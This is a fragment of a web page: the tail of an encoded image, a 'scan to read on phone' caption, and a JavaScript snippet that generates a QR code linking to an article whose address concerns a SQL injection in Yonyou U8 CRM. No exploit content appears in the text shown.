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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 